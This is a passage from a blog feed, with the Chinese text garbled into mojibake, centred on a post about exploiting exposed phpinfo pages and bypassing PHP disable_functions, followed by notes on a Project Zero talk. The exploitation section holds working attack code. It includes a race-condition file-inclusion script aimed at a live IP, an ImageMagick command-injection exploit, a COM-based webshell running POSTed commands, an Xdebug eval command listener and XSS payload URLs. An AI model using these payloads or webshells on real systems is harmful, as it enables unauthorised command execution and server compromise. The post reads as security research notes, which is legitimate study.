class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></span><br><span class="line">response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</span><br><span class="line">data = response.content</span><br><span class="line">data = re.search(r<span class="string">"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">reqs = <span class="string">'http://47.97.221.96:23333/index.php?action=../..'</span>+data</span><br><span class="line"><span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></span><br><span class="line"><span class="keyword">print</span> reqs</span><br><span class="line">response = requests.get(reqs, verify=<span class="keyword">False</span>)</span><br><span class="line">data = response.content</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">self</span>.queue.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(NumOfThreads):</span><br><span class="line">    t=checkHash(queue)</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">0</span>, <span class="number">9999</span>):</span><br><span class="line">x=str(x)</span><br><span class="line">queue.put(x.strip())</span><br><span class="line"></span><br><span class="line">queue.join()</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ:<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p><h2 id="0x02-é‡è¦é…ç½®"><a href="#0x02-é‡è¦é…ç½®" class="headerlink" title="0x02 é‡è¦é…ç½®"></a>0x02 é‡è¦é…ç½®</h2><h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸ä¼šå¼€å¯</p><h3 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png" alt="image"></p><p>phpæ ‡ç­¾æœ‰4ç§å½¢å¼ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹ä¸å¼€å¯çš„è¯(ä¸€èˆ¬é»˜è®¤ä¸å¼€å¯)ï¼Œä½¿ç”¨aspçš„æ ‡ç­¾æ˜¯ä¸ä¼šè§£æçš„ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç¯‡<code>user.ini</code>+<code>asp_tags</code>ç»•è¿‡çš„æ–‡ç«  <a href="https://www.math1as.com/index.php/archives/468/" target="_blank" rel="noopener">é’ˆå¯¹å†…å®¹(php tags)æ£€æµ‹çš„ä¸€ç§ç»•è¿‡æ€è·¯</a></p><p>å®é™…å°±æ˜¯é€šè¿‡å‘å…¶ä¸­æ·»åŠ <code>php_value asp_tags On</code>å¹¶ä¸Šä¼ <code>.htaccess</code>å’Œ<code>.user.ini</code>æ¥bypassã€‚</p><p>åŸç†ï¼Œasp_tagsçš„å±æ€§æ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_INI_PERDIRï¼šæŒ‡ä»¤å¯ä»¥åœ¨php.iniã€httpd.confæˆ–.htaccessæ–‡ä»¶ä¸­ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š åœ¨PHP 7å·²ç»å®Œå…¨ç§»é™¤äº†è¿™ç§æ ‡ç­¾</p><h3 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a>short_open_tag</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/h4bGaFaceD.png" alt="image"><br>è¿˜æ˜¯æ ‡ç­¾çš„é—®é¢˜ï¼Œå…è®¸&lt;??&gt;è¿™ç§å½¢å¼ï¼Œå¹¶ä¸”&lt;?=ç­‰ä»·äº&lt;? echo</p><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/mF8ekJH0mJ.png" alt="image"><br>æœ‰æ—¶å€™æˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªwebshellå´ä¸èƒ½ç”¨ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯ç®¡ç†å‘˜åšäº†é…ç½®ï¼Œç¦ç”¨äº†phpæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚</p><p>ç»•è¿‡çš„æ–¹å¼æœ‰è¿™ä¹ˆå‡ ä¸ªï¼š</p><p>1.é»‘åå•ç»•è¿‡<br>ç™¾å¯†ä¸€ç–ï¼Œå¯»æ‰¾é»‘åå•ä¸­æ¼æ‰çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­ç¦ç”¨çš„å‡½æ•°ç®—æ˜¯æ¯”è¾ƒå…¨çš„äº†ã€‚</p><p>æ¯”å¦‚æœ‰æ—¶å€™æ²¡æœ‰ç¦ç”¨proc_open</p><p>æ¯”å¦‚åœ¨ç¼–è¯‘phpæ—¶å¦‚æœåŠ äº†-â€“enable-pcntlé€‰é¡¹ï¼Œå°±å¯ä»¥ä½¿ç”¨pcntl_exec()æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚<br>pcntl_execå‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼Œç‰ˆæœ¬è¦æ±‚ï¼šPHP &gt; 4.2.0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(â€œ/bin/bashâ€, <span class="keyword">array</span>(â€œ/tmp/b4dboy.shâ€));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://secoff.net/archives/116.html" target="_blank" rel="noopener">æ¸—é€æŠ€å·§ï¼šåˆ©ç”¨pcntl_execçªç ´disable_functions</a></p><p>2.åˆ©ç”¨æ‰©å±•ï¼ˆå¦‚ImageMagickï¼‰ç»•è¿‡<br><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">åˆ©ç”¨ImageMagickæ¼æ´ç»•è¿‡disable_function</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == <span class="string">'cli'</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">''</span>) &#123;</span><br><span class="line">    $command = <span class="string">'id'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://www.waitalone.cn/wp-content/uploads/2016/05/20160510040129174.jpg" alt="image"></p><p>3.<a href="http://www.vuln.cn/6784" target="_blank" rel="noopener">åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡php disable_function</a></p><p>4.åˆ©ç”¨æ‰©å±•åº“ç»•è¿‡</p><p><strong>Windowsé ç³»ç»Ÿç»„ä»¶</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$command=$_POST[a];</span><br><span class="line"></span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.$command);  <span class="comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line"></span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Linuxä¸‹å¯é€šè¿‡ç¼–è¯‘æ‹“å±•åº“è¿›è¡Œç»•è¿‡</strong></p><p><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshellä¸‹å‘½ä»¤æ‰§è¡Œé™åˆ¶åŠç»•è¿‡æ–¹æ³•</a></p><h3 id="enable-dl"><a href="#enable-dl" class="headerlink" title="enable_dl"></a>enable_dl</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/8k74AiDbJ9.png" alt="image"><br>ä¸Šé¢è¯´çš„åˆ©ç”¨æ‰©å±•åº“ç»•è¿‡disable_functionsï¼Œéœ€è¦ä½¿ç”¨dl()å¹¶ä¸”å¼€å¯è¿™ä¸ªé€‰é¡¹</p><h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png" alt="image"><br>å®ƒæ˜¯ç”¨æ¥å®ç°addslshes()å’Œstripslashes()è¿™ä¸¤ä¸ªåŠŸèƒ½çš„ï¼Œå¯¹SQLæ³¨å…¥è¿›è¡Œé˜²å¾¡ã€‚</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png" alt="image"><br>è¿™ä¸ªå‚æ•°å°†ç”¨æˆ·å¯æ“ä½œçš„æ–‡ä»¶é™åˆ¶åœ¨æŸç›®å½•ä¸‹ï¼Œä½†æ˜¯è¿™ä¸ªé™åˆ¶æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚</p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5å…¨ç‰ˆæœ¬ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p><h2 id="0x03æ‰©å±•"><a href="#0x03æ‰©å±•" class="headerlink" title="0x03æ‰©å±•"></a>0x03æ‰©å±•</h2><h3 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h3><p>å‰æ®µæ—¶é—´å½±å“æ¯”è¾ƒå¤§çš„æ¼æ´ï¼Œæ³¨æ„çœ‹ç‰ˆæœ¬ã€‚</p><p>æ¼æ´å½±å“ImageMagick 6.9.3-10ä¹‹å‰çš„ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ubuntuæºä¸­å®‰è£…çš„ImageMagickã€‚</p><p><a href="http://blog.topsec.com.cn/ad_lab/imagemagick-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ImageMagick æ¼æ´åˆ©ç”¨æ–¹å¼åŠåˆ†æ</a></p><p><a href="http://www.jianshu.com/p/502e39c122e6" target="_blank" rel="noopener">ImageMagickè¿œç¨‹æ‰§è¡Œæ¼æ´åˆ†æåŠåˆ©ç”¨</a></p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h3><p>libxml 2.9ä»¥å‰çš„ç‰ˆæœ¬é»˜è®¤æ”¯æŒå¹¶å¼€å¯äº†å¤–éƒ¨å®ä½“çš„å¼•ç”¨ï¼ŒæœåŠ¡ç«¯è§£æç”¨æˆ·æäº¤çš„ xml æ–‡ä»¶æ—¶æœªå¯¹ xml æ–‡ä»¶å¼•ç”¨çš„å¤–éƒ¨å®ä½“ï¼ˆå«å¤–éƒ¨æ™®é€šå®ä½“å’Œå¤–éƒ¨å‚æ•°å®ä½“ï¼‰åšåˆé€‚çš„å¤„ç†ï¼Œä¼šå¯¼è‡´XXEã€‚</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">Memcacheæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨åŠä¿®å¤</a></p><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">åˆ©ç”¨rediså†™webshell</a></p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>1.åºåˆ—åŒ–çš„ä¸€äº›é—®é¢˜<br><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170912/7g4402ghe1.png" alt="image"><br>åºåˆ—åŒ–å¤„ç†å™¨ä¸ä¸€è‡´å¯¼è‡´å¯¹è±¡æ³¨å…¥</p><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œå½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡Session Upload Progressæ¥è®¾ç½®sessionã€‚</p><p>å…·ä½“å¯ä»¥çœ‹å¦ä¸€ç¯‡æ–‡ç« <a href="http://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="noopener">phpå¯¹è±¡æ³¨å…¥æ€»ç»“</a>ã€‚</p><p>2.session.upload_progressåŠ æœ¬åœ°æ–‡ä»¶åŒ…å«=getshell</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a></p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>xdebugå‘½ä»¤æ‰§è¡Œ</p><p><a href="https://paper.seebug.org/397/" target="_blank" rel="noopener">Xdebug: A Tiny Attack Surface</a></p><p><a href="https://paper.seebug.org/668/" target="_blank" rel="noopener">Xdebug æ”»å‡»é¢åœ¨ PhpStorm ä¸Šçš„ç°å®åˆ©ç”¨</a></p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line"></span><br><span class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    conn.sendall(<span class="string">'eval -i 1 -- %s\x00'</span> % data.encode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure><h3 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h3><p>ä¸»è¦åœ¨ssrfä¸­ä½¿ç”¨</p><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">åˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢</a></p><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p><h2 id="0x04å…¶å®ƒ"><a href="#0x04å…¶å®ƒ" class="headerlink" title="0x04å…¶å®ƒ"></a>0x04å…¶å®ƒ</h2><h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>phpä¸å­˜åœ¨ç¼“å­˜æ–‡ä»¶ï¼Œä½†æ˜¯å…¶æœ‰opcacheï¼Œå¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ å°±å¯ä»¥è¿›è¡Œè¦†ç›–å¹¶getshell</p><h3 id="â€˜act-â€™é—®é¢˜"><a href="#â€˜act-â€™é—®é¢˜" class="headerlink" title="â€˜act=â€™é—®é¢˜"></a>â€˜act=â€™é—®é¢˜</h3><p>æµ‹è¯•ç‰ˆæœ¬ï¼šPHP Version 5.6.22:<br>å‘æ˜æ–¹æ³•ï¼šå³é”®æºä»£ç æœç´¢ï¼šact= </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http-sql-injectï¼šhttp://target/phpinfo.php?act=Function</span><br><span class="line">xssï¼šhttp://target/phpinfo.php/&apos;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">csrfæˆ–è·¨åŸŸåç‚¹å‡»åŠ«æŒ:http://target/phpinfo.php#bottom#fghj#dfghjk </span><br><span class="line">xss:http://target/phpinfo.php?act=rt&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="åŸŸ-amp-ç”¨æˆ·"><a href="#åŸŸ-amp-ç”¨æˆ·" class="headerlink" title="åŸŸ&amp;ç”¨æˆ·"></a>åŸŸ&amp;ç”¨æˆ·</h3><p>phpinfoé¡µé¢è¿˜èƒ½çœ‹åˆ°å½“å‰åŸŸï¼Œå½“å‰ç™»å½•ç”¨æˆ·</p><p>å·¥å…·</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>å‚è€ƒ</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-åŸºæœ¬ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#0x00-åŸºæœ¬ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;0x00 åŸºæœ¬ä¿¡æ¯&quot;&gt;&lt;/a&gt;0x00 åŸºæœ¬ä¿¡æ¯&lt;/h2&gt;&lt;h3 id=&quot;system-info&quot;&gt;&lt;a href=&quot;#system-info&quot; c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>project zero talk note</title>
    <link href="http://zer0yu.github.io/2018/11/12/pz-talk-note/"/>
    <id>http://zer0yu.github.io/2018/11/12/pz-talk-note/</id>
    <published>2018-11-11T16:11:24.000Z</published>
    <updated>2018-11-11T16:12:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å®šä½"><a href="#0x01-å®šä½" class="headerlink" title="0x01 å®šä½"></a>0x01 å®šä½</h2><p>ä»»åŠ¡:è®©0dayæ›´éš¾</p><p>å·¥ä½œ:</p><ul><li>æ¼æ´ç ”ç©¶</li><li>exploitå¼€å‘</li><li>ç¼“è§£è®¾è®¡å’Œå®¡æŸ¥</li></ul><h2 id="0x02-Project-Zeroå¦‚ä½•æ‰¾bug"><a href="#0x02-Project-Zeroå¦‚ä½•æ‰¾bug" class="headerlink" title="0x02 Project Zeroå¦‚ä½•æ‰¾bug"></a>0x02 Project Zeroå¦‚ä½•æ‰¾bug</h2><h3 id="1-æˆ‘åº”è¯¥ä»å“ªå„¿æ‰¾ï¼Ÿ"><a href="#1-æˆ‘åº”è¯¥ä»å“ªå„¿æ‰¾ï¼Ÿ" class="headerlink" title="1.æˆ‘åº”è¯¥ä»å“ªå„¿æ‰¾ï¼Ÿ"></a>1.æˆ‘åº”è¯¥ä»å“ªå„¿æ‰¾ï¼Ÿ</h3><ul><li>ä¼˜å…ˆçº§ã€‚ æ”»å‡»è€…ä¼šåœ¨å“ªé‡Œçœ‹ï¼Ÿé‡è§†å•ä¸ªç ”ç©¶äººå‘˜çš„ç»éªŒ+ä¸“ä¸šçŸ¥è¯†</li><li>æ‰¾åˆ°æ–°çš„æ”»å‡»é¢ï¼Œæˆ–è¿­ä»£å·²çŸ¥çš„æ”»å‡»é¢ã€‚</li></ul><h3 id="2-æˆ‘åº”è¯¥æ€ä¹ˆæ‰¾ï¼Ÿ-ä¹Ÿå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ä¸€ä¸ªåˆ‡å…¥è§’åº¦"><a href="#2-æˆ‘åº”è¯¥æ€ä¹ˆæ‰¾ï¼Ÿ-ä¹Ÿå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ä¸€ä¸ªåˆ‡å…¥è§’åº¦" class="headerlink" title="2.æˆ‘åº”è¯¥æ€ä¹ˆæ‰¾ï¼Ÿ  ä¹Ÿå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ä¸€ä¸ªåˆ‡å…¥è§’åº¦"></a>2.æˆ‘åº”è¯¥æ€ä¹ˆæ‰¾ï¼Ÿ  ä¹Ÿå°±æ˜¯æ€ä¹ˆæ‰¾åˆ°ä¸€ä¸ªåˆ‡å…¥è§’åº¦</h3><ul><li>é€‰æ‹©å¤„ç†ä¸å¯ä¿¡æ•°æ®çš„è¾“å…¥ç‚¹å¹¶æ‰¾åˆ°å…¶bugsã€‚</li><li>é€‰æ‹©ä¸€ä¸ªbugç±»æ¥æŸ¥æ‰¾å®ä¾‹ã€‚</li><li>é€‰æ‹©ä¸€ä¸ªåŠŸèƒ½/è§„èŒƒï¼Œæ‰¾å‡ºä¸åŒå®ç°ä¸­çš„å¸¸è§ç¼ºé™·ã€‚</li><li>æŸ¥æ‰¾å·²çŸ¥é—®é¢˜çš„å˜å½¢ã€‚</li></ul><h3 id="3-CVE-2018-10751"><a href="#3-CVE-2018-10751" class="headerlink" title="3.CVE-2018-10751"></a>3.CVE-2018-10751</h3><ul><li>ä¸‰æ˜ŸGalaxy S7 Edgeä¸­çš„OMACPæº¢å‡ºâ€“ç”±çŸ­ä¿¡è§¦å‘</li><li>é€šè¿‡å¯»æ‰¾å¤„ç†SMSçš„Intentæ‰¾åˆ°</li><li>ä¸€å¹´å‰ï¼ŒContextisæŠ¥é“äº†ä¸€ä¸ªç±»ä¼¼çš„é”™è¯¯</li></ul><h3 id="4-Fuzzing"><a href="#4-Fuzzing" class="headerlink" title="4.Fuzzing"></a>4.Fuzzing</h3><p>Canonical mutation fuzzing(å¤§æ¦‚æ„æ€æ˜¯åˆ©ç”¨ç»å…¸æ•°æ®çš„å˜ç§æ¥è¿›è¡Œfuzz)ï¼šè¯­æ–™åº“åˆ›å»ºï¼Œå‚æ•°ä¼˜åŒ–ï¼Œæ¨¡ç³Šæµ‹è¯•ï¼Œè¦†ç›–åé¦ˆï¼Œå´©æºƒåˆ†æã€‚</p><p>è‡ªå®šä¹‰æ¨¡ç³Šæµ‹è¯•ï¼Œå¦‚å®šåˆ¶ç”Ÿæˆå™¨æˆ–æ–‡ä»¶æ ¼å¼çªå˜æ„ŸçŸ¥ã€‚</p><h3 id="5-æ‰‹åŠ¨å®¡æŸ¥"><a href="#5-æ‰‹åŠ¨å®¡æŸ¥" class="headerlink" title="5.æ‰‹åŠ¨å®¡æŸ¥"></a>5.æ‰‹åŠ¨å®¡æŸ¥</h3><p>æœ‰æ—¶æ˜¯çº¿æ€§çš„ï¼šæšä¸¾å‡½æ•°åˆ—è¡¨å¹¶å‰å‘åˆ†æã€‚</p><p>æœ‰æ—¶æ¨ªå‘ï¼šæ‰¾åˆ°ä¸€äº›è„†å¼±å±æ€§çš„å®ä¾‹ï¼ˆé”™è¯¯ç±»ï¼Œé‡å¤é”™è¯¯ï¼Œéæ ‡å‡†æ¨¡å¼ï¼‰ï¼Œç¨åå»ºç«‹â€œè§¦å‘ç‚¹â€ã€‚</p><h2 id="0x03-å¯¹æœªæ¥çš„é¢„æµ‹"><a href="#0x03-å¯¹æœªæ¥çš„é¢„æµ‹" class="headerlink" title="0x03 å¯¹æœªæ¥çš„é¢„æµ‹"></a>0x03 å¯¹æœªæ¥çš„é¢„æµ‹</h2><ol><li>æ‰‹åŠ¨åˆ†ææ–¹å¼ä¸ä¼šæ”¹å˜</li><li>åŸºæœ¬æ¨¡ç³Šæµ‹è¯•ç»“æœä¸ä¼šå¾ˆå¥½</li><li>ä»£ç è¦†ç›–ç‡åè¯­æ–™åº“æ¨åŠ¨æ–°å·¥ä½œ</li><li>é™æ€åˆ†æå¯¹VRæ¥è¯´æ•ˆç‡ä»ç„¶ä¸é«˜</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-å®šä½&quot;&gt;&lt;a href=&quot;#0x01-å®šä½&quot; class=&quot;headerlink&quot; title=&quot;0x01 å®šä½&quot;&gt;&lt;/a&gt;0x01 å®šä½&lt;/h2&gt;&lt;p&gt;ä»»åŠ¡:è®©0dayæ›´éš¾&lt;/p&gt;
&lt;p&gt;å·¥ä½œ:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¼æ´ç ”ç©¶&lt;/li&gt;
&lt;li&gt;e
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬”è®°</title>
    <link href="http://zer0yu.github.io/2018/11/11/assembly-note/"/>
    <id>http://zer0yu.github.io/2018/11/11/assembly-note/</id>
    <published>2018-11-11T15:18:41.000Z</published>
    <updated>2018-11-11T15:20:35.000Z</updated>
    
